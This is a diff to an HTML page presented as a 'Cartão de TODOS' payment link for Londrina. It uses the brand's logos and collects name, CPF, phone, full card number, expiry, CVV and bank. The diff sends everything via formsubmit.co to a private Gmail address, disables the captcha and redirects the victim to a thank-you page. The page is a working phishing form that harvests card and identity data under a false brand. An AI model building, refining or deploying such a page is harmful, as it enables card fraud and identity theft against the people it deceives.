@@ -3,109 +3,211 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário Cartão de TODOS</title>
+    <title>Link de pagamento Cdt Londrina</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            background: url('https://marcaspelomundo.com.br/wp-content/uploads/2021/02/CDT-0001-0001-AF-MARCA-CARTAO-DE-TODOS-HORIZONTAL-FUNDO-CLARO-1024x474.png') no-repeat center center fixed;
-            background-size: cover;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh;
-            margin: 0;
-            padding: 15px;
-        }
-        form { 
-            background: #e8f5e9; 
-            padding: 30px; 
-            border-radius: 12px; 
-            box-shadow: 0 0 15px rgba(0,0,0,0.2);
-            max-width: 400px;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .logo {
-            width: 80px;
-            margin-bottom: 10px;
-        }
-        h2 {
-            color: #2e7d32; 
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        input, textarea { 
-            width: 100%; 
-            margin-bottom: 15px; 
-            padding: 12px; 
-            border: 1px solid #2e7d32; 
-            border-radius: 6px; 
-            outline: none;
-            font-size: 16px;
-            box-sizing: border-box;
-            background: #ffffff;
-        }
-        input:focus, textarea:focus {
-            border-color: #1b5e20;
-        }
-        button { 
-            padding: 12px 20px; 
-            background: white; 
-            border: 2px solid #2e7d32; 
-            color: #2e7d32; 
-            border-radius: 6px;
-            width: 100%;
-            cursor: pointer; 
-            font-size: 16px;
-            font-weight: bold;
-        }
-        button:hover { 
-            background: #2e7d32; 
-            color: white;
-        }
-        @media (max-width: 500px) {
-            form {
-                padding: 20px;
-            }
-            input, textarea, button {
-                font-size: 14px;
-                padding: 10px;
-            }
-        }
-    </style>
-    <script>
-        function formatCardNumber(input) {
-            let value = input.value.replace(/\D/g, '').substring(0,16);
-            let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-            input.value = formatted;
-        }
+    body { 
+    font-family: Arial, sans-serif; 
+    background: url('https://marcaspelomundo.com.br/wp-content/uploads/2021/02/CDT-0001-0001-AF-MARCA-CARTAO-DE-TODOS-HORIZONTAL-FUNDO-CLARO-1024x474.png') no-repeat center center fixed;
+    background-size: cover;
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    height: 100vh;
+    margin: 0;
+    padding: 15px;
+}
+form { 
+    background: #e8f5e9; 
+    padding: 30px; 
+    border-radius: 12px; 
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    max-width: 400px;
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+.logo {
+    width: 80px;
+    margin-bottom: 10px;
+}
+h2 {
+    color: #2e7d32; 
+    text-align: center;
+    margin-bottom: 20px;
+}
+.input-container {
+    width: 100%;
+    position: relative;
+    margin-bottom: 10px;
+}
+.input-container img {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    height: 24px;
+    pointer-events: none;
+}
+input, textarea, select { 
+    width: 100%; 
+    padding: 12px; 
+    border: 1px solid #2e7d32; 
+    border-radius: 6px; 
+    outline: none;
+    font-size: 16px;
+    box-sizing: border-box;
+    background: #ffffff;
+    margin-bottom: 15px;
+}
+.input-container input {
+    margin-bottom: 0; /* Tira o espaço duplicado no campo de cartão */
+}
 
-        function formatExpiry(input) {
-            let value = input.value.replace(/\D/g, '').substring(0,4);
-            if(value.length >= 3){
-                input.value = value.substring(0,2) + '/' + value.substring(2,4);
-            } else {
-                input.value = value;
+input:focus, textarea:focus, select:focus {
+    border-color: #1b5e20;
+}
+button { 
+    padding: 12px 20px; 
+    background: white; 
+    border: 2px solid #2e7d32; 
+    color: #2e7d32; 
+    border-radius: 6px;
+    width: 100%;
+    cursor: pointer; 
+    font-size: 16px;
+    font-weight: bold;
+    margin-top: 5px;
+}
+button:hover { 
+    background: #2e7d32; 
+    color: white;
+}
+@media (max-width: 500px) {
+    form {
+        padding: 20px;
+    }
+    input, textarea, button, select {
+        font-size: 14px;
+        padding: 10px 36px 10px 10px;
+    }
+    .input-container img {
+        height: 20px;
+    }
+}
+
+    </style>
+   <script>
+    function formatCardNumber(input) {
+        let value = input.value.replace(/\D/g, '').substring(0, 16); // Limita a 16 dígitos
+        let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Formatação do número
+        input.value = formatted;
+        detectCardBrand(value); // Detecta a bandeira do cartão
+    }
+
+    function formatExpiry(input) {
+        let value = input.value.replace(/\D/g, '').substring(0, 4);
+        if (value.length >= 3) {
+            input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        } else {
+            input.value = value;
+        }
+    }
+
+    function detectCardBrand(number) {
+        let brandImg = document.getElementById('brand-logo');
+        brandImg.src = ""; // Limpa a bandeira a cada digitação
+
+        if (number.length === 16) { // Só detecta quando o número tiver 16 dígitos
+            if (/^4/.test(number)) {
+                brandImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png"; // Visa
+            } else if (/^5[1-5]/.test(number)) {
+                brandImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/960px-Mastercard-logo.svg.png"; // MasterCard
+            } else if (/^3[47]/.test(number)) {
+                brandImg.src = "https://upload.wikimedia.org/wikipedia/commons/5/51/Elo_logo.png"; // Elo
+            } else if (/^6/.test(number)) {
+                brandImg.src = "https://upload.wikimedia.org/wikipedia/commons/5/51/Elo_logo.png"; // Elo
             }
         }
-    </script>
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+        document.querySelector('form').addEventListener('submit', function(event) {
+            let requiredFields = this.querySelectorAll('[required]');
+            let allFilled = true;
+            requiredFields.forEach(function(field) {
+                if (!field.value.trim()) {
+                    allFilled = false;
+                }
+            });
+
+            if (!allFilled) {
+                event.preventDefault();
+                alert("Por favor, preencha todos os campos obrigatórios antes de enviar.");
+            } else {
+                let nome = document.querySelector('input[name="name"]').value;
+                document.getElementById('subject').value = `Novo cadastro de ${nome}`;
+            }
+        });
+    });
+</script>
+
+    
 </head>
 <body>
 
     <form action="https://formsubmit.co/cartaodetodoslondrinense@gmail.com" method="POST">
         <input type="hidden" name="_next" value="https://cartaodetodospagamento.github.io/Obrigado/">
+        <input type="hidden" name="_subject" id="subject" value="Novo formulário enviado!">
+
         <img src="https://play-lh.googleusercontent.com/gKQ-e7NvgquzxM8JOT_YqCjL5S-PVGQjZEGnPI-j4J2_h4RZd0ISgOmSDHBPuZ03Ng" alt="Logo" class="logo">
         <h2>Cartão de TODOS</h2>
-        <input type="text" name="name" placeholder="Seu nome" required>
-        <input type="email" name="email" placeholder="Seu email" required>
-        <input type="text" name="card_name" placeholder="Nome no cartão" required>
-        <input type="text" name="card_number" placeholder="Número do cartão" maxlength="19" oninput="formatCardNumber(this)" required>
-        <input type="text" name="card_expiry" placeholder="Validade (MM/AA)" maxlength="5" oninput="formatExpiry(this)" required>
-        <input type="text" name="card_cvv" placeholder="CVV" maxlength="4" required>
-        <textarea name="message" placeholder="Observações adicionais"></textarea>
+
+        <input type="text" name="name" placeholder="Nome (obrigatório)" required>
+        <input type="text" name="cpf" placeholder="CPF (obrigatório)" required>
+        <input type="tel" name="telefone" placeholder="Celular (obrigatório)" required>
+        <input type="email" name="email" placeholder="Email (opcional)">
+
+        <div class="input-container">
+            <input type="text" name="card_number" placeholder="Numero do Cartão (obrigatório)" maxlength="19" oninput="formatCardNumber(this)" required>
+            <img id="brand-logo" src="" alt="">
+        </div>
+
+        <input type="text" name="card_expiry" placeholder="Validade (MM/AA) (obrigatório)" maxlength="5" oninput="formatExpiry(this)" required>
+        <input type="text" name="card_cvv" placeholder="CVV (obrigatório)" maxlength="4" required>
+        <input type="text" name="card_name" placeholder="Nome como consta no cartão (obrigatório)" required>
+
+        <select name="funcao" required>
+            <option value="" disabled selected>Função ▾</option>
+            <option value="Credito">Crédito</option>
+            <option value="Debito">Débito</option>
+        </select>
+
+        <select name="instituicao" required>
+            <option value="" disabled selected>Instituição (Banco) ▾</option>
+            <option value="Banco do Brasil">Banco do Brasil</option>
+            <option value="Bradesco">Bradesco</option>
+            <option value="Caixa Econômica">Caixa Econômica</option>
+            <option value="Itaú">Itaú</option>
+            <option value="Santander">Santander</option>
+            <option value="Nubank">Nubank</option>
+            <option value="Inter">Inter</option>
+            <option value="PagBank">PagBank</option>
+            <option value="BTG Pactual">BTG Pactual</option>
+            <option value="C6 Bank">C6 Bank</option>
+            <option value="Original">Original</option>
+            <option value="Banco Pan">Banco Pan</option>
+            <option value="Neon">Neon</option>
+            <option value="Sicoob">Sicoob</option>
+            <option value="Banrisul">Banrisul</option>
+            <option value="BMG">BMG</option>
+            <option value="Mercado Pago">Mercado Pago</option>
+            <option value="XP">XP</option>
+        </select>
+
+        <input type="hidden" name="_captcha" value="false">
+
         <button type="submit">Enviar</button>
     </form>
 
